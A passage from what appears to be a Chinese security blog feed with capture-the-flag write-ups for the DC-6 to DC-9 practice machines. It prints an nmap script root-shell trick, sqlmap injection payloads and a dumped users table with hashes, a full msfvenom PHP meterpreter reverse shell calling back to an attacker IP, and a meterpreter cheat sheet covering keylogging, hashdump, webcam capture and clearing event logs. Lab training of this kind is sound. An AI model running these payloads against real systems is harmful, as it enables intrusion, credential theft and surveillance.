<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --script=exe.nse  #脚本中的内容 os.execute("/bin/bash")</span><br><span class="line"></span><br><span class="line">echo 'os.execute("/bin/bash")' &gt;&gt; exe.nse</span><br><span class="line">nmap --script=./exe.nse</span><br></pre></td></tr></table></figure>

<p><img data-src="./DC-6/16.png" alt></p>
<p>OK!~</p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>DC</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-7</title>
    <url>/2021/01/24/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/DC-7/</url>
    <content><![CDATA[<h1 id="DC-7"><a href="#DC-7" class="headerlink" title="DC-7"></a>DC-7</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>DC-7</li>
<li>windows10</li>
</ul>
<h3 id="官方提示"><a href="#官方提示" class="headerlink" title="官方提示"></a>官方提示</h3><p><img data-src="./DC-7/1.png" alt></p>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:fa:35:f2, IPv4: 192.168.43.86</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    66:bb:7b:e9:5c:3b       (Unknown: locally administered)</span><br><span class="line">192.168.43.18   08:00:27:54:bb:d4       PCS Systemtechnik GmbH</span><br><span class="line">192.168.43.25   38:d2:ca:db:01:69       Zhejiang Tmall Technology Co., Ltd.</span><br><span class="line">192.168.43.188  d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.939 seconds (132.03 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 192.168.43.18</li>
<li>NMAP</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.43.18</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# nmap -sV -A -p 1-65535 192.168.43.18</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-23 23:06 EST</span><br><span class="line">Nmap scan report for 192.168.43.18</span><br><span class="line">Host is up (0.0073s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 d0:02:e9:c7:5d:95:32:ab:10:99:89:84:34:3d:1e:f9 (RSA)</span><br><span class="line">|   256 d0:d6:40:35:a7:34:a9:0a:79:34:ee:a9:6a:dd:f4:8f (ECDSA)</span><br><span class="line">|_  256 a8:55:d5:76:93:ed:4f:6f:f1:f7:a1:84:2f:af:bb:e1 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-generator: Drupal 8 (https://www.drupal.org)</span><br><span class="line">| http-robots.txt: 22 disallowed entries (15 shown)</span><br><span class="line">| /core/ /profiles/ /README.txt /web.config /admin/ </span><br><span class="line">| /comment/reply/ /filter/tips /node/add/ /search/ /user/register/ </span><br><span class="line">| /user/password/ /user/login/ /user/logout/ /index.php/admin/ </span><br><span class="line">|_/index.php/comment/reply/</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Welcome to DC-7 | D7</span><br><span class="line">MAC Address: 08:00:27:54:BB:D4 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   7.29 ms 192.168.43.18</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 17.87 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./DC-7/2.png" alt></p>
<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><p><img data-src="./DC-7/3.png" alt></p>
<ul>
<li><p>发现是 <code>Drupal cms</code></p>
</li>
<li><p><code>kali whatweb</code>尝试</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">whatweb http://192.168.43.18/</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# whatweb http://192.168.43.18/</span><br><span class="line">http://192.168.43.18/ [200 OK] Apache[2.4.25], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[192.168.43.18], MetaGenerator[Drupal 8 (https://www.drupal.org)], PoweredBy[-block], Script, Title[Welcome to DC-7 | D7], UncommonHeaders[x-drupal-dynamic-cache,link,x-content-type-options,x-generator,x-drupal-cache], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=edge]</span><br></pre></td></tr></table></figure>

<ul>
<li>搜索 <strong>DC7USER</strong></li>
</ul>
<p><img data-src="./DC-7/4.png" alt></p>
<p><code>github</code>中发现一些线索</p>
<p>下载源码查看</p>
<p><img data-src="./DC-7/5.png" alt></p>
<ul>
<li>发现账号密码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dc7user &#x2F; MdR3xOgB7#dW  $dbname &#x3D; &quot;Staff&quot;</span><br></pre></td></tr></table></figure>

<h3 id="SSH-DC7USER"><a href="#SSH-DC7USER" class="headerlink" title="SSH DC7USER"></a>SSH DC7USER</h3><p><img data-src="./DC-7/6.png" alt></p>
<p><img data-src="./DC-7/7.png" alt></p>
<p><img data-src="./DC-7/8.png" alt></p>
<p>备注: 发现需要拿一个后台<code>shell</code>可以直接提权到<code>root</code></p>
<ul>
<li>修改<code>admin</code>密码登入后台</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">drush user-password admin --password="123456"</span><br></pre></td></tr></table></figure>

<h3 id="前台获取shell"><a href="#前台获取shell" class="headerlink" title="前台获取shell"></a>前台获取shell</h3><p><img data-src="./DC-7/9.png" alt></p>
<ul>
<li>发现不能够编写<code>php</code>代码</li>
<li>安装组件<code>https://www.drupal.org/project/php</code></li>
</ul>
<p><img data-src="./DC-7/10.png" alt></p>
<p><img data-src="./DC-7/11.png" alt></p>
<p><img data-src="./DC-7/12.png" alt></p>
<p><img data-src="./DC-7/13.png" alt></p>
<h3 id="进入后台"><a href="#进入后台" class="headerlink" title="进入后台"></a>进入后台</h3><ul>
<li>中国<code>antsword</code></li>
</ul>
<p><img data-src="./DC-7/14.png" alt></p>
<ul>
<li>运行脚本</li>
</ul>
<p><img data-src="./DC-7/15.png" alt></p>
<ul>
<li>收到反弹<code>shell</code></li>
</ul>
<p><img data-src="./DC-7/16.png" alt></p>
<p><img data-src="./DC-7/17.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>DC</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-8</title>
    <url>/2021/01/31/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/DC-8/</url>
    <content><![CDATA[<h1 id="DC-8"><a href="#DC-8" class="headerlink" title="DC-8"></a>DC-8</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>DC-8</li>
<li>windows10</li>
</ul>
<h3 id="官方提示"><a href="#官方提示" class="headerlink" title="官方提示"></a>官方提示</h3><ul>
<li>提示存在<code>sql</code>注入</li>
</ul>
<p><img data-src="./DC-8/1.png" alt></p>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:50:56:28:f2:ec, IPv4: 192.168.43.86</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    b6:83:15:88:c9:f6       (Unknown: locally administered)</span><br><span class="line">192.168.43.13   08:00:27:bb:e4:3f       PCS Systemtechnik GmbH</span><br><span class="line">192.168.43.225  20:0d:b0:30:02:d2       Shenzhen Four Seas Global Link Network Technology Co., Ltd.</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.986 seconds (128.90 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 192.168.43.13</li>
<li>NMAP</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.43.13</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-30 23:57 EST</span><br><span class="line">Nmap scan report for 192.168.43.13</span><br><span class="line">Host is up (0.00043s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 35:a7:e6:c4:a8:3c:63:1d:e1:c0:ca:a3:66:bc:88:bf (RSA)</span><br><span class="line">|   256 ab:ef:9f:69:ac:ea:54:c6:8c:61:55:49:0a:e7:aa:d9 (ECDSA)</span><br><span class="line">|_  256 7a:b2:c6:87:ec:93:76:d4:ea:59:4b:1b:c6:e8:73:f2 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-server-header: Apache</span><br><span class="line">|_http-title: Welcome to DC-8 | DC-8</span><br><span class="line">MAC Address: 08:00:27:BB:E4:3F (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.43 ms 192.168.43.13</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 14.42 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./DC-8/2.png" alt></p>
<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><p><img data-src="./DC-8/3.png" alt></p>
<ul>
<li>发现是 <code>Drupal cms</code></li>
</ul>
<h3 id="发现SQL注入"><a href="#发现SQL注入" class="headerlink" title="发现SQL注入"></a>发现SQL注入</h3><p><img data-src="./DC-8/4.png" alt></p>
<p><img data-src="./DC-8/5.png" alt></p>
<ul>
<li><code>SQLMAP</code>一把梭</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.43.13/?nid=3%27</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">sqlmap identified the following injection point(s) with a total of 1822 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: nid (GET)</span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL OR error-based - WHERE or HAVING clause (FLOOR)</span><br><span class="line">    Payload: nid=-6414 OR 1 GROUP BY CONCAT(0x716a6a6b71,(SELECT (CASE WHEN (3958=3958) THEN 1 ELSE 0 END)),0x71706a6b71,FLOOR(RAND(0)*2)) HAVING MIN(0)#</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace</span><br><span class="line">    Payload: nid=(CASE WHEN (4354=4354) THEN SLEEP(5) ELSE 4354 END)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: MySQL UNION query (random number) - 1 column</span><br><span class="line">    Payload: nid=-1453 UNION ALL SELECT CONCAT(0x716a6a6b71,0x6a7362644272706d576e5054446169656148686861544f574b536579667041744c6c4444566d5165,0x71706a6b71)#</span><br><span class="line">---</span><br><span class="line">[00:15:02] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web application technology: Apache</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 数据库</span></span><br><span class="line">python sqlmap.py -u http://192.168.43.13/?nid=3%27 --dbs</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span><br><span class="line">[00:17:25] [INFO] fetching database names</span><br><span class="line">[00:17:25] [WARNING] reflective value(s) found and filtering out</span><br><span class="line">[00:17:25] [WARNING] potential permission problems detected ('command denied')</span><br><span class="line">[00:17:25] [INFO] retrieved: 'd7db'</span><br><span class="line">[00:17:25] [INFO] retrieved: 'information_schema'</span><br><span class="line">available databases [2]:</span><br><span class="line">[*] d7db</span><br><span class="line">[*] information_schema</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 表</span></span><br><span class="line">python sqlmap.py -u http://192.168.43.13/?nid=3%27 -D d7db --tables</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line"></span><br><span class="line">[00:18:49] [INFO] retrieved: 'webform_submitted_data'</span><br><span class="line">Database: d7db</span><br><span class="line">[88 tables]</span><br><span class="line">+-----------------------------+</span><br><span class="line">| filter                      |</span><br><span class="line">| system                      |</span><br><span class="line">| actions                     |</span><br><span class="line">| authmap                     |</span><br><span class="line">| batch                       |</span><br><span class="line">| block                       |</span><br><span class="line">| block_custom                |</span><br><span class="line">| block_node_type             |</span><br><span class="line">| block_role                  |</span><br><span class="line">| blocked_ips                 |</span><br><span class="line">| cache                       |</span><br><span class="line">| cache_block                 |</span><br><span class="line">| cache_bootstrap             |</span><br><span class="line">| cache_field                 |</span><br><span class="line">| cache_filter                |</span><br><span class="line">| cache_form                  |</span><br><span class="line">| cache_image                 |</span><br><span class="line">| cache_menu                  |</span><br><span class="line">| cache_page                  |</span><br><span class="line">| cache_path                  |</span><br><span class="line">| cache_views                 |</span><br><span class="line">| cache_views_data            |</span><br><span class="line">| ckeditor_input_format       |</span><br><span class="line">| ckeditor_settings           |</span><br><span class="line">| ctools_css_cache            |</span><br><span class="line">| ctools_object_cache         |</span><br><span class="line">| date_format_locale          |</span><br><span class="line">| date_format_type            |</span><br><span class="line">| date_formats                |</span><br><span class="line">| field_config                |</span><br><span class="line">| field_config_instance       |</span><br><span class="line">| field_data_body             |</span><br><span class="line">| field_data_field_image      |</span><br><span class="line">| field_data_field_tags       |</span><br><span class="line">| field_revision_body         |</span><br><span class="line">| field_revision_field_image  |</span><br><span class="line">| field_revision_field_tags   |</span><br><span class="line">| file_managed                |</span><br><span class="line">| file_usage                  |</span><br><span class="line">| filter_format               |</span><br><span class="line">| flood                       |</span><br><span class="line">| history                     |</span><br><span class="line">| image_effects               |</span><br><span class="line">| image_styles                |</span><br><span class="line">| menu_custom                 |</span><br><span class="line">| menu_links                  |</span><br><span class="line">| menu_router                 |</span><br><span class="line">| node                        |</span><br><span class="line">| node_access                 |</span><br><span class="line">| node_revision               |</span><br><span class="line">| node_type                   |</span><br><span class="line">| queue                       |</span><br><span class="line">| rdf_mapping                 |</span><br><span class="line">| registry                    |</span><br><span class="line">| registry_file               |</span><br><span class="line">| role                        |</span><br><span class="line">| role_permission             |</span><br><span class="line">| search_dataset              |</span><br><span class="line">| search_index                |</span><br><span class="line">| search_node_links           |</span><br><span class="line">| search_total                |</span><br><span class="line">| semaphore                   |</span><br><span class="line">| sequences                   |</span><br><span class="line">| sessions                    |</span><br><span class="line">| shortcut_set                |</span><br><span class="line">| shortcut_set_users          |</span><br><span class="line">| site_messages_table         |</span><br><span class="line">| taxonomy_index              |</span><br><span class="line">| taxonomy_term_data          |</span><br><span class="line">| taxonomy_term_hierarchy     |</span><br><span class="line">| taxonomy_vocabulary         |</span><br><span class="line">| url_alias                   |</span><br><span class="line">| users                       |</span><br><span class="line">| users_roles                 |</span><br><span class="line">| variable                    |</span><br><span class="line">| views_display               |</span><br><span class="line">| views_view                  |</span><br><span class="line">| watchdog                    |</span><br><span class="line">| webform                     |</span><br><span class="line">| webform_component           |</span><br><span class="line">| webform_conditional         |</span><br><span class="line">| webform_conditional_actions |</span><br><span class="line">| webform_conditional_rules   |</span><br><span class="line">| webform_emails              |</span><br><span class="line">| webform_last_download       |</span><br><span class="line">| webform_roles               |</span><br><span class="line">| webform_submissions         |</span><br><span class="line">| webform_submitted_data      |</span><br><span class="line">+-----------------------------+</span><br><span class="line"></span><br><span class="line">[00:18:49] [WARNING] HTTP error codes detected during run:</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> users 表数据</span></span><br><span class="line">python sqlmap.py -u http://192.168.43.13/?nid=3%27 -D d7db -T users --dump</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">0	&lt;blank&gt;	&lt;blank&gt;	&lt;blank&gt;	&lt;blank&gt;</span><br><span class="line">1	admin	dc8blah@dc8blah.org	$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z	dcau-user@outlook.com</span><br><span class="line">2	john	john@blahsdfsfd.org	$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF	john@blahsdfsfd.org</span><br></pre></td></tr></table></figure>

<p><img data-src="./DC-8/6.png" alt></p>
<p><code>john</code> 破解密码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">john / turtle</span><br></pre></td></tr></table></figure>

<h3 id="进入后台"><a href="#进入后台" class="headerlink" title="进入后台"></a>进入后台</h3><p><img data-src="./DC-8/7.png" alt></p>
<ul>
<li>修改网页，种入<code>webshell</code></li>
</ul>
<p><img data-src="./DC-8/8.png" alt></p>
<p><img data-src="./DC-8/9.png" alt></p>
<p><img data-src="./DC-8/10.png" alt></p>
<ul>
<li>生成反弹<code>shell</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.43.172 LPORT=7777 R &gt; shell.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">/*&lt;?php /**/ error_reporting(0); $ip = '192.168.43.172'; $port = 7777; if (($f = 'stream_socket_client') &amp;&amp; is_callable($f)) &#123; $s = $f("tcp://&#123;$ip&#125;:&#123;$port&#125;"); $s_type = 'stream'; &#125; if (!$s &amp;&amp; ($f = 'fsockopen') &amp;&amp; is_callable($f)) &#123; $s = $f($ip, $port); $s_type = 'stream'; &#125; if (!$s &amp;&amp; ($f = 'socket_create') &amp;&amp; is_callable($f)) &#123; $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) &#123; die(); &#125; $s_type = 'socket'; &#125; if (!$s_type) &#123; die('no socket funcs'); &#125; if (!$s) &#123; die('no socket'); &#125; switch ($s_type) &#123; case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; &#125; if (!$len) &#123; die(); &#125; $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) &lt; $len) &#123; switch ($s_type) &#123; case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; &#125; &#125; $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') &amp;&amp; ini_get('suhosin.executor.disable_eval')) &#123; $suhosin_bypass=create_function('', $b); $suhosin_bypass(); &#125; else &#123; eval($b); &#125; die();</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 监听端口建立会话</span></span><br><span class="line">1 使用handler模块</span><br><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">2 设置payload</span><br><span class="line">msf exploit(multi/handler) &gt; set PAYLOAD php/meterpreter/reverse_tcp（当时windows时php换成windows）</span><br><span class="line">PAYLOAD =&gt;php/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">3 设置监听主机</span><br><span class="line">msfexploit(multi/handler) &gt; set LHOST 192.168.43.172</span><br><span class="line">LHOST =&gt;192.168.43.172</span><br><span class="line"></span><br><span class="line">4 设置监听端口（默认4444）</span><br><span class="line">msfexploit(multi/handler) &gt; set LPORT 7777</span><br><span class="line">LPORT =&gt; 4444</span><br><span class="line"></span><br><span class="line">5 发动攻击</span><br><span class="line">msfexploit(multi/handler) &gt; exploit</span><br><span class="line">注:要远程访问你上传的后门文件</span><br><span class="line"></span><br><span class="line">meterpreter &gt; keyscan_start</span><br><span class="line">keyscan_dump // 查看键盘记录</span><br><span class="line">监控目标系统键盘输入，停止监控为keyscan_stop</span><br><span class="line"></span><br><span class="line">meterpreter &gt; migrate</span><br><span class="line">将你的Meterpreter移到另一个进程</span><br><span class="line">先用PS命令查看进程后，得到进程ID，然后在执行Migrate （进程ID）</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">获取用户的服务器运行</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">进入目标电脑，命令提示符</span><br><span class="line"></span><br><span class="line">meterpreter &gt; Idletime</span><br><span class="line">目标电脑闲置了多长时间</span><br><span class="line"></span><br><span class="line">meterpreter &gt; Hashdump</span><br><span class="line">导出对方SAM数据库里的内容,推荐一个hash破解网站：</span><br><span class="line">http://www.objectif-securite.ch/products.php</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">利用已自漏洞，自动提权为SYSTEM</span><br><span class="line"></span><br><span class="line">meterpreter &gt; clearev</span><br><span class="line">清除事件日志</span><br><span class="line"></span><br><span class="line">meterpreter &gt; execute（某Windows指令）</span><br><span class="line">在对方电脑上运行该指令</span><br><span class="line"></span><br><span class="line">meterpreter &gt; execute </span><br><span class="line">Usage: execute -f file [options]</span><br><span class="line"></span><br><span class="line">meterpreter &gt; download（文件路径）</span><br><span class="line">下载文件命令</span><br><span class="line">例如下载C盘下面的jzking121.txt文件</span><br><span class="line"></span><br><span class="line">meterpreter &gt; download c:\\jzking121.txt</span><br><span class="line">[*] downloading: c:\jzking121.txt -&gt; jzking121.txt</span><br><span class="line">[*] downloaded : c:\jzking121.txt -&gt; jzking121.txt</span><br><span class="line">注意，文件路径中要有两个\\</span><br><span class="line">Upload指令跟Download指令类似！</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shutdown </span><br><span class="line">关闭目标计算机，reboot为重启计算机</span><br><span class="line"></span><br><span class="line">meterpreter &gt;screenshot</span><br><span class="line">获取目标电脑，屏幕截图</span><br><span class="line"></span><br><span class="line">meterpreter &gt; uictl enable keyboard 启用目标使用键盘</span><br><span class="line"></span><br><span class="line">meterpreter &gt; uictl disable mouse   禁止目标使用鼠标</span><br><span class="line"></span><br><span class="line">enable 启用</span><br><span class="line"></span><br><span class="line">disable 禁用</span><br><span class="line"></span><br><span class="line">meterpreter &gt; webcam_list</span><br><span class="line">目标系统的摄像头列表</span><br><span class="line"></span><br><span class="line">meterpreter &gt; webcam_snap</span><br><span class="line">从指定的摄像头，拍摄照片</span><br><span class="line"> </span><br><span class="line">meterpreter &gt; search -d c:\\ -f 1.jpg</span><br><span class="line">搜索目标电脑，C盘1.jpg文件</span><br></pre></td></tr></table></figure>

<ul>
<li>拿到<code>shell</code></li>
</ul>
<p><img data-src="./DC-8/11.png" alt></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><img data-src="./DC-8/12.png" alt></p>
<p><img data-src="./DC-8/13.png" alt></p>
<ul>
<li><p>版本号为 <code>4.89</code></p>
</li>
<li><p><code>searchsploit exim</code></p>
</li>
</ul>
<p><img data-src="./DC-8/14.png" alt></p>
<ul>
<li><code>kali</code>开启<code>http</code>服务器</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 8888</span><br></pre></td></tr></table></figure>

<p><img data-src="./DC-8/15.png" alt></p>
<ul>
<li>运行，发现</li>
</ul>
<p><img data-src="./DC-8/16.png" alt></p>
<p>这是由于 <code>unix</code>上运行<code>win</code>的脚本导致</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 使用vim打开文件 解决</span><br><span class="line">vim aaa.sh</span><br><span class="line"># 转换格式</span><br><span class="line">:set ff&#x3D;unix</span><br><span class="line"># 保存文件</span><br><span class="line">:wq</span><br></pre></td></tr></table></figure>

<p><img data-src="./DC-8/17.png" alt></p>
<ul>
<li>默认失败</li>
</ul>
<p><img data-src="./DC-8/18.png" alt></p>
<ul>
<li>选用第二种方式</li>
</ul>
<p><img data-src="./DC-8/19.png" alt></p>
<p><img data-src="./DC-8/20.png" alt></p>
<p><img data-src="./DC-8/21.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>DC</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-9</title>
    <url>/2021/02/03/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/DC-9/</url>
    <content><![CDATA[<h1 id="DC-9"><a href="#DC-9" class="headerlink" title="DC-9"></a>DC-9</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>DC-9</li>
<li>windows10</li>
</ul>
<h3 id="官方介绍"><a href="#官方介绍" class="headerlink" title="官方介绍"></a>官方介绍</h3><p><img data-src="./DC-9/1.png" alt></p>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:50:56:28:f2:ec, IPv4: 192.168.43.172</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    da:55:f7:51:dc:f2       (Unknown: locally administered)</span><br><span class="line">192.168.43.104  08:00:27:dc:99:c4       PCS Systemtechnik GmbH</span><br><span class="line">192.168.43.225  20:0d:b0:30:02:d2       Shenzhen Four Seas Global Link Network Technology Co., Ltd.</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.978 seconds (129.42 hosts/sec). 3 